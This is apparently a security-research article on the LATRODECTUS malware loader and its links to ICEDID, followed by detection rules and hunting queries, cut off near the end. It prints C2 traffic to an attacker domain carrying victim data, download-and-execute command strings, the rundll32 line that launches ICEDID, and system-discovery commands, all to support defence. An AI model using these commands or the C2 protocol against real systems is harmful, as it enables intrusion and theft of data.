{
  "attributes": {
    "raw": {
      "document": "---\ntitle: \"Spring Cleaning with LATRODECTUS: A Potential Replacement for ICEDID\"\nslug: \"spring-cleaning-with-latrodectus\"\ndate: \"2024-05-16\"\nsubtitle: \"The LATRODECTUS loader evolves to deliver ICEDID and other malware\"\ndescription: \"Elastic Security Labs has observed an uptick in a recent emerging loader known as LATRODECTUS. This lightweight loader packs a big punch with ties to ICEDID and may turn into a possible replacement to fill the gap in the loader market.\"\nauthor:\n  - slug: daniel-stepanic\n  - slug: samir-bousseaden\nimage: \"Security Labs Images 16.jpg\"\ncategory:\n  - slug: malware-analysis\ntags:\n  - icedid\n  - latrodectus\n  - loader\n---\n\n## LATRODECTUS at a glance\n\nFirst [discovered](https://medium.com/walmartglobaltech/icedid-gets-loaded-af073b7b6d39) by Walmart researchers in October of 2023, [LATRODECTUS](https://malpedia.caad.fkie.fraunhofer.de/details/win.unidentified_111) is a malware loader gaining popularity among cybercriminals. While this is considered a new family, there is a strong link between LATRODECTUS and [ICEDID](https://www.elastic.co/security-labs/thawing-the-permafrost-of-icedid-summary) due to behavioral and developmental similarities, including a command handler that downloads and executes encrypted payloads like ICEDID. Proofpoint and Team Cymru built upon this connection to discover a [strong link](https://www.proofpoint.com/us/blog/threat-insight/latrodectus-spider-bytes-ice) between the network infrastructure used by both the operators of ICEDID and LATRODECTUS.\n\nLATRODECTUS offers a comprehensive range of standard capabilities that threat actors can utilize to deploy further payloads, conducting various activities after initial compromise. The code base isn’t obfuscated and contains only 11 command handlers focused on enumeration and execution. This type of loader represents a recent wave observed by our team such as [PIKABOT](https://www.elastic.co/security-labs/pikabot-i-choose-you), where the code is more lightweight and direct with a limited number of handlers. \n\nThis article will focus on LATRODECTUS itself, analyzing its most significant features and sharing resources for addressing this financially impactful threat.\n\n### Key takeaways\n\n - Initially discovered by Walmart researchers last year, LATRODECTUS continues to gain adoption among recent financially-motivated campaigns\n - LATRODECTUS, a possible replacement for ICEDID shares similarity to ICEDID including a command handler to execute ICEDID payloads\n - We observed new event handlers (process discovery, desktop file listing) since its inception and integration of a self-delete technique to delete running files\n - Elastic Security provides a high degree of capability through memory signatures, behavioral rules, and hunting opportunities to respond to threats like LATRODECTUS\n\n### LATRODECTUS campaign overview\n\nBeginning early March of 2024, Elastic Security Labs observed an increase in email campaigns delivering LATRODECTUS. These campaigns typically involve a recognizable infection chain involving oversized JavaScript files that utilize WMI’s ability to invoke msiexec.exe and install a remotely-hosted MSI file, remotely hosted on a WEBDAV share.\n\n![](/assets/images/spring-cleaning-with-latrodectus/image44.png)\n\nWith major changes in the loader space during the past year, such as the [QBOT](https://www.elastic.co/security-labs/qbot-malware-analysis) takedown and [ICEDID](https://www.elastic.co/security-labs/unpacking-icedid) dropping off, we are seeing new loaders such as [PIKABOT](https://www.elastic.co/security-labs/pikabot-i-choose-you) and [LATRODECTUS](https://malpedia.caad.fkie.fraunhofer.de/details/win.unidentified_111) have emerged as possible replacements.\n\n## LATRODECTUS analysis\n\nOur LATRODECTUS [sample](https://www.virustotal.com/gui/file/aee22a35cbdac3f16c3ed742c0b1bfe9739a13469cf43b36fb2c63565111028c/details) comes initially packed with file information [masquerading](https://attack.mitre.org/techniques/T1036/) as a component to Bitdefender’s kernel-mode driver (TRUFOS.SYS), shown in the following image.\n\n![File version information of packed LATRODECTUS sample](/assets/images/spring-cleaning-with-latrodectus/image47.png)\n\n\nIn order to move forward with malware analysis, the sample must be unpacked manually or via an automatic unpacking service such as [UnpacMe](http://Unpac.Me).\n\n![UnpacMe summary](/assets/images/spring-cleaning-with-latrodectus/image26.png)\n\n\nLATRODECTUS is a DLL with 4 different exports, and each export is assigned the same export address.\n\n![Exports for LATRODECTUS](/assets/images/spring-cleaning-with-latrodectus/image21.png)\n\n\n### String obfuscation \n\nAll of the strings within LATRODECTUS are protected using a straightforward algorithm on the encrypted bytes and applying a transformation by performing arithmetic and bitwise operations. The initial [report](https://medium.com/walmartglobaltech/icedid-gets-loaded-af073b7b6d39) published in 2023 detailed a PRNG algorithm that was not observed in our sample, suggesting continuous development of this loader. Below is the algorithm implemented in Python using our [nightMARE framework](https://github.com/elastic/labs-releases/tree/main/nightMARE):\n\n``` python\ndef decrypt_string(encrypted_bytes: bytes) -> bytes:\n    x = cast.u32(encrypted_bytes[:4])\n    y = cast.u16(encrypted_bytes[4:6])\n    byte_size = cast.u16(cast.p32(x ^ y)[:2])\n    decoded_bytes = bytearray(byte_size)\n\n    for i, b in enumerate(encrypted_bytes[6 : 6 + byte_size]):\n        decoded_bytes[i] = ((x + i + 1) ^ b) % 256\n\n    return bytes(decoded_bytes)\n```\n\n### Runtime API\n\nLATRODECTUS obfuscates the majority of its imports until runtime. At the start of the program, it queries the PEB in combination with using a CRC32 checksum to resolve ```kernel32.dll``` and ```ntdll.dll``` modules and their functions. In order to resolve additional libraries such as ```user32.dll``` or ```wininet.dll```, the malware takes a different approach performing a wildcard search (```*.dll```) in the Windows system directory. It retrieves each DLL filename and passes them directly to a CRC32 checksum function. \n\n![DLL search using a CRC32 checksum](/assets/images/spring-cleaning-with-latrodectus/image15.png)\n\n\n### Anti-analysis\nWhen all the imports are resolved, LATRODECTUS performs several serial anti-analysis checks. The first monitors for a debugger by looking for the BeingDebugged flag inside the Process Environment Block (PEB). If a debugger is identified, the program terminates.\n\n![```BeingDebugged``` check via PEB](/assets/images/spring-cleaning-with-latrodectus/image35.png)\n\n\nIn order to avoid sandboxes or virtual machines that may have a low number of active processes, two validation checks are used to combine the number of running processes with the OS product version. \n\n![Number of processes and OS validation checks](/assets/images/spring-cleaning-with-latrodectus/image30.png)\n\n\nIn order to account for the major differences between Windows OS versions, the developer uses a custom enum based on the major/minor version, and build numbers within Windows.\n\n![Enum related to build numbers, OS version](/assets/images/spring-cleaning-with-latrodectus/image4.png)\n\n\nThe two previous conditions translate to:\n\n - LATRODECTUS will exit if the number of processes is less than 75 and the OS version is a recent build such as Windows 10, Windows Server 2016, or Windows 11\n - LATRODECTUS will exit if the number of processes is less than 50 and the OS version is an older build such as Windows Server 2003 R2, Windows XP, Windows 2000, Windows 7, Windows 8, or Windows Server 2012/R2\n\nAfter the sandbox check, LATRODECTUS verifies if the current process is running under WOW64, a subsystem of Windows operating systems that allows for 32-bit applications to run on 64-bit systems. If true (running as a 32-bit application on a 64-bit OS), the malware will exit.\n\n![```IsWow64Process``` check](/assets/images/spring-cleaning-with-latrodectus/image27.png)\n\n\nThe last check is based on verifying the MAC address via the ```GetAdaptersInfo()``` call from ```iphlpapi.dll```. If there is no valid MAC Address, the malware will also terminate.\n\n![MAC Address check](/assets/images/spring-cleaning-with-latrodectus/image36.png)\n\n\n### Mutex\n\nThis malware uses the string ```runnung``` as the mutex to prevent re-infection on the host, which may be an accidental typo on the part of developers.\n\n![Mutex](/assets/images/spring-cleaning-with-latrodectus/image29.png)\n\n\n### Hardware ID\n\nAfter the mutex creation, LATRODECTUS will generate a hardware ID that is seeded from the volume serial number of the machine in combination with multiplying a hard-coded constant (```0x19660D```).\n\n![HWID calculation](/assets/images/spring-cleaning-with-latrodectus/image6.png)\n\n\n### Campaign ID\n\nAt this stage, the decrypted campaign name (```Littlehw```) from our sample is used as a seed passed into a Fowler–Noll–Vo hashing [function](https://en.wikipedia.org/wiki/Fowler%E2%80%93Noll%E2%80%93Vo_hash_function). This will produce a hash that is used by the actor to track different campaigns and associated victim machines.\n\n![Campaign ID calculation using FNV](/assets/images/spring-cleaning-with-latrodectus/image37.png)\n\n\n### Setup / persistence\n\nThe malware will generate a folder path using a configuration parameter, these determine the location where LATRODECTUS will be dropped on disk, such as the following directories:\n - ```AppData```\n - ```Desktop```\n - ```Startup```\n - ```Personal```\n - ```Local\\AppData```\n\nOur sample was configured with the ```AppData``` location using a hard-coded directory string ```Custom_update``` along with a hardcoded filename ```Update_``` concatenated with digits seeded from the volume serial number. Below is the full file path inside our VM:\n\n```\nC:\\Users\\REM\\AppData\\Roaming\\Custom_update\\Update_88d58563.dll\n```\n\nThe malware will check for an existing file ```AppData\\Roaming\\Custom_update\\update_data.dat``` to read from, and if the file does not exist it will create the directory before writing a copy of itself in the directory.\n\n![LATRODECTUS written in ```AppData```](/assets/images/spring-cleaning-with-latrodectus/image7.png)\n\n\nAfter the file is copied, LATRODECTUS retrieves two C2 domains from the global configuration, using the previously-described string decryption function.\n\n![Decrypting C2 servers](/assets/images/spring-cleaning-with-latrodectus/image19.png)\n\n\nBefore the main thread is executed for command dispatching, LATRODECTUS sets up a scheduled task for persistence using the Windows Component Object Model (COM). \n\n![Scheduled task creation via COM](/assets/images/spring-cleaning-with-latrodectus/image14.png)\n\n\nIn our sample, the task name is hardcoded as ```Updater``` and scheduled to execute upon successful logon.\n\n![Scheduled task properties](/assets/images/spring-cleaning-with-latrodectus/image12.png)\n\n\n### Self-deletion\n\nSelf-deletion is one noteworthy technique incorporated by LATRODECTUS. It was [discovered](https://x.com/jonasLyk/status/1350401461985955840) by Jonas Lykkegaard and implemented by Lloyd Davies in the delete-self-poc [repo](https://github.com/LloydLabs/delete-self-poc). The technique allows LATRODECTUS to delete itself while the process is still running using an alternate data stream. \n\nElastic Security Labs has seen this technique adopted in malware such as the [ROOK](https://chuongdong.com/reverse%20engineering/2022/01/06/RookRansomware/#anti-detection-alternate-data-streams) ransomware family. The likely objective is to hinder incident response processes by interfering with collection and analysis. The compiled malware contains a [string](https://github.com/LloydLabs/delete-self-poc/blob/49fe92218fdcfe8e173aa60a9eb307bae07cb027/main.h#L10) (```:wtfbbq```) present in the repository.\n\n![Self-deletion code in LATRODECTUS](/assets/images/spring-cleaning-with-latrodectus/image2.png)\n\n\nThis technique is observed at the start of the infection as well as when the malware performs an update using event handler #15. Elastic Security Labs has created a [CAPA rule](https://github.com/mandiant/capa-rules/blob/master/anti-analysis/anti-forensic/self-deletion/self-delete-using-alternate-data-streams.yml) to help other organizations identify this behavior generically when analyzing various malware.\n\n### Communication\n\nLATRODECTUS encrypts its requests using base64 and RC4 with a hardcoded password of ```12345```. The first POST request over HTTPS that includes victim information along with configuration details, registering the infected system.\n\n```\nPOST https://aytobusesre.com/live/ HTTP/1.1\nAccept: */*\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Tob 1.1)\nHost: aytobusesre.com\nContent-Length: 256\nCache-Control: no-cache\n\nM1pNDFh7flKrBaDJqAPvJ98BTFDZdSDWDD8o3bMJbpmu0qdYv0FCZ0u6GtKSN0g//WHAS2npR/HDoLtIKBgkLwyrIh/3EJ+UR/0EKhYUzgm9K4DotfExUiX9FBy/HeV7C4PgPDigm55zCU7O9kSADMtviAodjuRBVW3DJ2Pf5+pGH9SG1VI8bdmZg+6GQFpcFTGjdWVcrORkxBjCGq3Eiv2svt3+ZFIN126PcvN95YJ0ie1Puljfs3wqsW455V7O\n```\n![Initial registration request](/assets/images/spring-cleaning-with-latrodectus/image32.png)\n\n\nBelow is an example of the decrypted contents sent in the first request:\n\n```\ncounter=0&type=1&guid=249507485CA29F24F77B0F43D7BA&os=6&arch=1&username=user&group=510584660&ver=1.1&up=4&direction=aytobusesre.com&mac=00:0c:24:0e:29:85;&computername=DESKTOP-3C4ILHO&domain=-\n```\n\n| Name | Description |\n| ---- | ----------- |\n| counter | Number of C2 requests increments by one for each callback |\n| type | Type of request (registration, etc) |\n| guid | Generated hardware ID seeded by volume serial number |\n| os | Windows OS product version |\n| arch | Windows architecture version |\n| username | Username of infected machine |\n| group | Campaign identifier seeded by unique string in binary with FNV |\n| version | LATRODECTUS version |\n| up | Unknown |\n| direction | C2 domain\n| mac | MAC Address |\n| computername | Hostname of infected machine |\n| domain | Domain belonging to infected machine |\n\nEach request is pipe-delimited by an object type, integer value, and corresponding argument. There are 4 object types which route the attacker controlled commands (**CLEARURL**, **URLS**, **COMMAND**, **ERROR**).  \n\n![Command dispatching logic](/assets/images/spring-cleaning-with-latrodectus/image39.png)\n\n\nThe main event handlers are passed through the **COMMAND** object type with the handler ID and their respective argument.\n\n```\nCOMMAND|12|http://www.meow123.com/test \n```\n\nThe **CLEARURL** object type is used to delete any configured domains. The **URLS** object type allows the attacker to swap to a new C2 URL. The last object type, **ERROR**, is not currently configured.\n\n![Example of command request via CyberChef](/assets/images/spring-cleaning-with-latrodectus/image11.png)\n\n\n### Bot Functionality\n\nLATRODECTUS’s core functionality is driven through its command handlers. These handlers are used to collect information from the victim machine, provide execution capabilities as well as configure the implant. We have seen two additional handlers (retrieve processes, desktop listing) added since the initial [publication](https://medium.com/walmartglobaltech/icedid-gets-loaded-af073b7b6d39) which may be a sign that the codebase is still active and changing. \n\n\n| Command ID | Description |\n| ---------- | ----------- |\n| 2 | Retrieve file listing from desktop directory |\n| 3 | Retrieve process ancestry |\n| 4 | Collect system information |\n| 12 | Download and execute PE |\n| 13 | Download and execute DLL |\n| 14 | Download and execute shellcode |\n| 15 | Perform update, restart |\n| 17 | Terminate own process and threads |\n| 18 | Download and execute ICEDID payload |\n| 19 | Increase Beacon Timeout |\n| 20 | Resets request counter |\n\n#### Desktop listing - command ID (2)\n\nThis command handler will retrieve a list of the contents of the user’s desktop, which the developer refers to as ```desklinks```. This data will be encrypted and appended to the outbound beacon request. This is used for enumerating and validating victim environments quickly.\n\n![Desktop listing (Handler #2)](/assets/images/spring-cleaning-with-latrodectus/image16.png)\n\n\n**Example request**:\n\n```\ncounter=0&type=1&guid=249507485CA29F24F77B0F43D7BA&os=6&arch=1&username=user&group=510584660&ver=1.1&up=4&direction=aytobusesre.com&desklinks=[\"OneDrive.lnk\",\"OneNote.lnk\",\"PowerPoint.lnk\",\"Notepad++.lnk\",\"Excel.lnk\",\"Google Chrome.lnk\",\"Snipping Tool.lnk\",\"Notepad.lnk\",\"Paint.lnk\"]\n```\n\n#### Process ancestry - command ID (3)\n\nThis event handler is referenced as **proclist** by the developer where it collects the entire running process ancestry from the infected machine via the **CreateToolhelp32Snapshot** API. \n\n![Retrieve process ancestry (Handler #3)](/assets/images/spring-cleaning-with-latrodectus/image25.png)\n\n\nLike security researchers, malware authors are interested in process parent/child relationships for decision-making. The authors of LATRODECTUS even collect information about process grandchildren, likely to validate different compromised environments.\n\n![Example of process ancestry collected by LATRODECTUS](/assets/images/spring-cleaning-with-latrodectus/image17.png)\n\n\n#### Collect system information - command ID (4)\n\nThis command handler creates a new thread that runs the following system discovery/enumeration commands, each of which is a potential detection opportunity:\n\n``` bash\nC:\\Windows\\System32\\cmd.exe /c ipconfig /all\nC:\\Windows\\System32\\cmd.exe /c systeminfo\nC:\\Windows\\System32\\cmd.exe /c nltest /domain_trusts\nC:\\Windows\\System32\\cmd.exe /c nltest /domain_trusts /all_trusts\nC:\\Windows\\System32\\cmd.exe /c net view /all /domain\nC:\\Windows\\System32\\cmd.exe /c net view /all\nC:\\Windows\\System32\\cmd.exe /c net group \"Domain Admins\" /domain\nC:\\Windows\\System32\\wbem\\wmic.exe /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get * /Format:List\nC:\\Windows\\System32\\cmd.exe /c net config workstation\nC:\\Windows\\System32\\cmd.exe /c wmic.exe /node:localhost /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct Get DisplayName | findstr /V /B /C:displayName || echo No Antivirus installed\nC:\\Windows\\System32\\cmd.exe /c whoami /groups\n```\n\nEach output is placed into URI with corresponding collected data:\n\n```\n&ipconfig=\n&systeminfo=\n&domain_trusts=\n&domain_trusts_all=\n&net_view_all_domain=\n&net_view_all=\n&net_group=\n&wmic=\n&net_config_ws=\n&net_wmic_av=\n&whoami_group=\n```\n\n#### Download and execute PE - command ID (12)\n\nThis handler downloads a PE file from the C2 server then writes the content to disk with a randomly generated file name, then executes the file.\n\n![Download and Run PE function (Handler #4)](/assets/images/spring-cleaning-with-latrodectus/image19.png)\n\n\nBelow is an example in our environment using this handler:\n\n![Process tree of download and run PE function](/assets/images/spring-cleaning-with-latrodectus/image34.png)\n\n\n#### Download and execute DLL - command ID (13)\n\nThis command handler downloads a DLL from C2 server, writes it to disk with a randomly generated file name, and executes the DLL using rundll32.exe.\n\n![Download and run DLL function (Handler #13)](/assets/images/spring-cleaning-with-latrodectus/image10.png)\n\n\n#### Download and execute shellcode - command (14)\n\nThis command handler downloads shellcode from the C2 server via ```InternetReadFile```, allocates and copies the shellcode into memory then directly calls it with a new thread pointing at the shellcode.\n\n![Shellcode execution (Handler #14)](/assets/images/spring-cleaning-with-latrodectus/image24.png)\n\n\n#### Update / restart  - command ID (15)\n\nThis handler appears to perform a binary update to the malware where it’s downloaded, the existing thread/mutex is notified, and then released. The file is subsequently deleted and a new binary is downloaded/executed before terminating the existing process.\n\n![Update handler (Handler #15)](/assets/images/spring-cleaning-with-latrodectus/image33.png)\n\n\n#### Terminate - command ID (17)\nThis handler will terminate the existing LATRODECTUS process.\n\n![Self-termination (Handler #17)](/assets/images/spring-cleaning-with-latrodectus/image46.png)\n\n\n#### Download and execute hosted ICEID payload - command ID (18)\n\nThis command handler downloads two ICEDID components from a LATRODECTUS server and executes them using a spawned ```rundll32.exe``` process. We haven’t personally observed this being used in-the-wild, however.\n\nThe handler creates a folder containing two files to the ```AppData\\Roaming\\``` directory. These file paths and filenames are seeded by a custom random number generator which we will review in the next section. In our case, this new folder location is: \n\n```\nC:\\Users\\REM\\AppData\\Roaming\\-632116337\n```\n\nIt retrieves a file (```test.dll```) from the C2 server, the standard ICEDID loader, which is written to disk with a randomly -generated file name (```-456638727.dll```).\n\n![LATRODECTUS downloading ICEDID loader](/assets/images/spring-cleaning-with-latrodectus/image9.png)\n\n\nLATRODECTUS will then perform similar steps by generating a random filename for the ICEDID payload (```1431684209.dat```). Before performing the download, it will set-up the arguments to properly load ICEDID. If you have run into ICEDID in the past, this part of the command-line should look familiar: it’s used to call the ICEDID export of the loader, while passing the relative path to the encrypted ICEDID payload file.\n\n```\ninit -zzzz=\"-632116337\\1431684209.dat\"\n```\n\n![LATRODECTUS downloading ICEDID data](/assets/images/spring-cleaning-with-latrodectus/image20.png)\n\n\nLATRODECUS initiates a second download request using a hard-coded URI (```/files/bp.dat```) from the configured C2 server, which is written to a file (```1431684209.dat```). Analyzing the ```bp.dat``` file, researchers identified it as a conventional encrypted ICEDID payload, commonly referenced as ```license.dat```.\n\n![Encrypted ICEDID payload (```bp.dat```)](/assets/images/spring-cleaning-with-latrodectus/image31.png)\n\n\nAfter decrypting the file, malware researchers noted a familiar 129 byte sequence of junk bytes prepended to the file followed by the custom section headers. \n\n![Decrypted ICEDID payload (```bp.dat```)](/assets/images/spring-cleaning-with-latrodectus/image43.png)\n\n\nOur team was able to revisit [prior tooling](https://www.elastic.co/security-labs/unpacking-icedid) and successfully decrypt this file, enabling us to rebuild the PE (ICEDID).\n\n![ICEDID YARA triggering on rebuilt PE from ```bp.dat```](/assets/images/spring-cleaning-with-latrodectus/image28.png)\n\n\nAt this point, the ICEDID loader and encrypted payload have been downloaded to the same folder.\n\n![](/assets/images/spring-cleaning-with-latrodectus/image38.png)\n\nThese files are then executed together using ```rundll32.exe``` via **CreateProcessW** with their respective arguments. Below is the observed command-line:\n\n```\nrundll32.exe C:\\Users\\REM\\AppData\\Roaming\\-632116337\\-456638727.dll,init -zzzz=\"-632116337\\1431684209.dat\"\n```\n\n![```Rundll32.exe``` execution](/assets/images/spring-cleaning-with-latrodectus/image18.png)\n\n\nScanning the ```rundll32.exe``` child process spawned by LATRODECTUS with our ICEDID YARA rule also indicates the presence of the ICEDID. \n\n![YARA memory scan detecting ICEDID](/assets/images/spring-cleaning-with-latrodectus/image41.png)\n\n\n#### Beacon timeout - command ID (19)\n\nLATRODECTUS supports jitter for beaconing to C2. This can make it harder for defenders to detect via network sources due to randomness this introduces to beaconing intervals.\n\n![Adjust timeout feature (Handler #19)](/assets/images/spring-cleaning-with-latrodectus/image45.png)\n\n\nIn order to calculate the timeout, it generates a random number by seeding a combination of the user’s cursor position on the screen multiplied by the system’s uptime (```GetTickCount```). This result is passed as a parameter to **RtlRandomEx**. \n\n![Random number generator using cursor position](/assets/images/spring-cleaning-with-latrodectus/image22.png)\n\n\n#### Reset counter - command ID (20)\n\nThis command handler will reset the request counter that is passed on each communication request. For example, on the third callback it is filled with 3 here. With this function, the developer can reset the count starting from 0.\n\n```\ncounter=3&type=4&guid=638507385\n```\n\n### LATRODECTUS / ICEDID connection\n\nThere definitely is some kind of development connection or working arrangement between ICEDID and LATRODECTUS. Below are some of the similarities observed:\n - Same enumeration commands in the system discovery handler\n - The DLL exports all point to same export function address, this was a common observation with ICEDID payloads\n - C2 data is concatenated together as variables in the C2 traffic requests\n - The ```bp.dat``` file downloaded from handler (#18) is used to execute the ICEDID payload via ```rundll32.exe``` \n - The functions appear to be similarly coded\n\n![COM-based Scheduled Task setup - ICEDID vs LATRODECTUS](/assets/images/spring-cleaning-with-latrodectus/image13.png)\n\n\nResearchers didn’t conclude that there was a clear relationship between the ICEDID and LATRODECTUS families, though they appear at least superficially affiliated. ICEDID possesses more mature capabilities, like those used for data theft or the [BackConnect](https://www.team-cymru.com/post/inside-the-icedid-backconnect-protocol) module, and has been richly documented over a period of several years. One hypothesis being considered is that LATRODECTUS is being actively developed as a replacement for ICEDID, and the handler (#18) was included until malware authors were satisfied with LATRODECTUS’ capabilities.\n\n### Sandboxing LATRODECTUS\n\nTo evaluate LATRODECTUS detections, we set up a Flask server configured with the different handlers to instruct an infected machine to perform various actions in a sandbox environment. This method provides defenders with a great opportunity to assess the effectiveness of their detection and logging tools against every capability. Different payloads like shellcode/binaries can be exchanged as needed.\n\n![Command handlers sandboxed](/assets/images/spring-cleaning-with-latrodectus/image42.png)\n\n\nAs an example, for the download and execution of a DLL (handler #13), we can provide the following request structure (object type, handler, arguments for handler) to the command dispatcher:\n\n```\nCOMMAND|13|http://www.meow123.com/dll, ShowMessage\n```\n\nThe following example depicts the RC4-encrypted string described earlier, which has been base64-encoded.\n\n```\nE3p1L21QSBOqEKjYrBKiLNZJTk7KZn+HWn0p2LQfOLWCz/py4VkkAxSXXdnDd39p2EU=\n```\n\nUsing the following CyberChef recipe, analysts can generate encrypted command requests:\n\n![Example with DLL Execution handler via CyberChef](/assets/images/spring-cleaning-with-latrodectus/image1.png)\n\n\nUsing the actual malware codebase and executing these different handlers using a low-risk framework, defenders can get a glimpse into the events, alerts, and logs recorded by their security instrumentation. \n\n## Detecting LATRODECTUS\n\nThe following Elastic Defend protection features trigger during the LATRODECTUS malware infection process: \n\n![Elastic Defend alerts against LATRODECTUS](/assets/images/spring-cleaning-with-latrodectus/image5.png)\n\n\nBelow are the prebuilt MITRE ATT&CK-aligned rules with descriptions:\n\n| ATT&CK technique | Elastic Rule | Description |\n| ----- | ----- | ----- |\n| [T1059.007 - Javascript](https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/execution_oversized_windows_script_execution.toml) [T1027 - Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027/) | [Suspicious Oversized Script Execution](https://github.com/elastic/protections-artifacts/blob/72bede645f2fbb34cf3882fa2758c896a0073c6b/behavior/rules/execution_oversized_windows_script_execution.toml) | LATRODECTUS is delivered via oversized Javascript files, on average more than 800KB filled with random text. |\n| [T1047 - Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047/) | [Execution via a Suspicious WMI Client](https://github.com/elastic/protections-artifacts/blob/72bede645f2fbb34cf3882fa2758c896a0073c6b/behavior/rules/initial_access_execution_via_a_suspicious_wmi_client.toml) | Javascript dropper invokes WMI to mount a WEBDAV share and invokes msiexec to install a remote msi file. |\n| [T1218.007 - Misexec](https://attack.mitre.org/techniques/T1218/007/) | [Remote File Execution via MSIEXEC](https://github.com/elastic/protections-artifacts/blob/72bede645f2fbb34cf3882fa2758c896a0073c6b/behavior/rules/defense_evasion_remote_file_execution_via_msiexec.toml) [Suspicious MsiExec Child Process](https://github.com/elastic/protections-artifacts/blob/72bede645f2fbb34cf3882fa2758c896a0073c6b/behavior/rules/defense_evasion_suspicious_msiexec_child_process.toml) | MSI file hosted on remote Webdav and executed in quiet mode. Once executed it drops a DLL and launches rundll32 to load it via the Advanced installer viewer.exe binary. |\n| [T1218.011 - Rundll32](https://attack.mitre.org/techniques/T1218/011/) | [Rundll32 or Regsvr32 Loaded a DLL from Unbacked Memory](https://github.com/elastic/protections-artifacts/blob/72bede645f2fbb34cf3882fa2758c896a0073c6b/behavior/rules/defense_evasion_rundll32_or_regsvr32_loaded_a_dll_from_unbacked_memory.toml) | Rundll32 loads the LATRODECTUS DLL from AppData and starts code injection. |\n| [T1055 - Process Injection](https://attack.mitre.org/techniques/T1055/) | [Memory Threat Detection Alert: Shellcode Injection](https://www.elastic.co/guide/en/security/current/configure-endpoint-integration-policy.html#memory-protection) [VirtualProtect API Call from an Unsigned DLL](https://github.com/elastic/protections-artifacts/blob/72bede645f2fbb34cf3882fa2758c896a0073c6b/behavior/rules/defense_evasion_virtualprotect_api_call_from_an_unsigned_dll.toml) [Shellcode Execution from Low Reputation Module](https://github.com/elastic/protections-artifacts/blob/72bede645f2fbb34cf3882fa2758c896a0073c6b/behavior/rules/defense_evasion_shellcode_execution_from_low_reputation_module.toml) [Network Module Loaded from Suspicious Unbacked Memory](https://github.com/elastic/protections-artifacts/blob/72bede645f2fbb34cf3882fa2758c896a0073c6b/behavior/rules/defense_evasion_network_module_loaded_from_suspicious_unbacked_memory.toml) | Shellcode execution triggers 3 endpoint behavior alerts and a memory threat detection alert. |\n| [T1053.005 - Scheduled Task](https://attack.mitre.org/techniques/T1053/005/) | [Scheduled Task Creation by an Unusual Process](https://github.com/elastic/protections-artifacts/blob/72bede645f2fbb34cf3882fa2758c896a0073c6b/behavior/rules/persistence_scheduled_task_creation_by_an_unusual_process.toml) | LATRODECTUS may persist using scheduled tasks (rundll32 will create a scheduled task). |\n| [T1070.004 - File Deletion](https://attack.mitre.org/techniques/T1070/004/) | [Potential Self Deletion of a Running Executable](https://github.com/elastic/protections-artifacts/blob/72bede645f2fbb34cf3882fa2758c896a0073c6b/behavior/rules/defense_evasion_potential_self_deletion_of_a_running_executable.toml) | Part of the malware DLL self update command and also when the DLL is not running from AppData, LATRODECTUS will delete itself while running and restart from the new path or running an updated version of itself leveraging [this technique](https://github.com/LloydLabs/delete-self-poc). |\n| [T1059.003 - Windows Command Shell](https://attack.mitre.org/techniques/T1059/003/) | [Command Shell Activity Started via RunDLL32](https://github.com/elastic/protections-artifacts/blob/72bede645f2fbb34cf3882fa2758c896a0073c6b/behavior/rules/execution_command_shell_activity_started_via_rundll32.toml) | LATRODECTUS Command ID (4) - Collect system information via a series of cmd.exe execution. |\n\nThe following list of hunts and detection queries can be used to detect LATRODECTUS post-exploitation commands focused on execution:\n\n**Rundll32 Download PE/DLL** (command handlers #12, #13 and #18): \n\n``` sql\nsequence by process.entity_id with maxspan=1s\n[file where event.action == \"creation\" and process.name : \"rundll32.exe\" and \n /* PE file header dropped to the InetCache folder */\nfile.Ext.header_bytes : \"4d5a*\" and file.path : \"?:\\\\Users\\\\*\\\\AppData\\\\Local\\\\Microsoft\\\\Windows\\\\INetCache\\\\IE\\\\*\"]\n[network where process.name : \"rundll32.exe\" and \n   event.action : (\"disconnect_received\", \"connection_attempted\") and \n   /* network disconnect activity to a public Ip address */\n   not cidrmatch(destination.ip, \"10.0.0.0/8\", \"127.0.0.0/8\", \"169.254.0.0/16\", \"172.16.0.0/12\", \"192.0.0.0/24\", \"192.0.0.0/29\", \"192.0.0.8/32\", \"192.0.0.9/32\", \"192.0.0.10/32\", \"192.0.0.170/32\", \"192.0.0.171/32\", \"192.0.2.0/24\", \"192.31.196.0/24\", \"192.52.193.0/24\", \"192.88.99.0/24\", \"224.0.0.0/4\", \"100.64.0.0/10\", \"192.175.48.0/24\",\"198.18.0.0/15\", \"198.51.100.0/24\", \"203.0.113.0/24\", \"240.0.0.0/4\", \"::1\", \"FE80::/10\", \"FF00::/8\", \"192.168.0.0/16\")]\n```\n\n![EQL Query using hunt detecting LATRODECTUS](/assets/images/spring-cleaning-with-latrodectus/image8.png)\n\n\nBelow is an ES|QL hunt to look for long-term and/or high count of network connections by rundll32 to a public IP address (which is uncommon): \n\n``` sql\nfrom logs-endpoint.events.network-*\n| where host.os.family == \"windows\" and event.category == \"network\" and\n network.direction == \"egress\" and process.name == \"rundll32.exe\" and\n/* excluding private IP ranges */\n not CIDR_MATCH(destination.ip, \"10.0.0.0/8\", \"127.0.0.0/8\", \"169.254.0.0/16\", \"172.16.0.0/12\", \"192.0.0.0/24\", \"192.0.0.0/29\", \"192.0.0.8/32\", \"192.0.0.9/32\", \"192.0.0.10/32\", \"192.0.0.170/32\", \"192.0.0.171/32\", \"192.0.2.0/24\", \"192.31.196.0/24\", \"192.52.193.0/24\", \"192.168.0.0/16\", \"192.88.99.0/24\", \"224.0.0.0/4\", \"100.64.0.0/10\", \"192.175.48.0/24\",\"198.18.0.0/15\", \"198.51.100.0/24\", \"203.0.113.0/24\", \"240.0.0.0/4\", \"::1\",\"FE80::/10\", \"FF00::/8\")\n| keep source.bytes, destination.address, process.name, process.entity_id, process.pid, @timestamp, host.name\n/* calc total duration and the number of connections per hour */\n| stats count_connections = count(*), start_time = min(@timestamp), end_time = max(@timestamp) by process.entity_id, process.pid, destination.address, process.name, host.name\n| eval duration = TO_DOUBLE(end_time)-TO_DOUBLE(start_time), duration_hours=TO_INT(duration/3600000), number_of_con_per_hour = (count_connections / duration_hours)\n| keep host.name, destination.address, process.name, process.pid, duration, duration_hours, number_of_con_per_hour, count_connections\n| where count_connections >= 100\n```\n\n![ES|QL Query using hunt detecting LATRODECTUS](/assets/images/spring-cleaning-with-latrodectus/image3.png)\n\n\nBelow is a screenshot of Elastic Defend 